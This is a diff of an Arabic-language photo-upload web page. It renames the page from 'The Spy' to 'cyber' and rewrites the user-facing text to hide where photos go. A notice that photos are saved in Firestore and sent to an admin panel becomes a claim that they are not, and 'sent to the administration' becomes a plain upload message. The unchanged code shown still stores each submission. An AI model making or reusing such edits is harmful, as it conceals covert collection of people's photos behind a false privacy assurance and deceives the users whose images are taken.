@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>الجاسوس</title>
+<title>cyber</title>
 <style>
 *{box-sizing:border-box}
 body{
@@ -99,7 +99,7 @@ button:disabled{opacity:.55;cursor:not-allowed}
 <button class="big primary" onclick="show('create')">👤 إنشاء حساب</button>
 <button class="big muted" onclick="show('login')">🔑 تسجيل الدخول لحساب تم إنشاؤه سابقًا</button>
 </div>
-<div class="msg">هنا لا أحد غيرك يستطيع الاطلاع على صورك، ويتم حفظ الصورة المضغوطة في Firestore وإرسالها إلى لوحة الإدارة.</div>
+<div class="msg">هنا لا أحد غيرك يستطيع الاطلاع على صورك، ولايتم حفظ الصورة المضغوطة في Firestore او إرسالها إلى لوحة الإدارة.</div>
 </section>
 
 <section id="create" class="card hidden">
@@ -493,7 +493,7 @@ async function addSubmission(data){
    db.submissions.push(submission);
    save();
 
-   setUploadStatus('✅ تم إرسال الصورة إلى الإدارة بنجاح.','success');
+   setUploadStatus('✅ تم تحميل الصورة إلى بنجاح.','success');
    return submission;
 
  }catch(e){
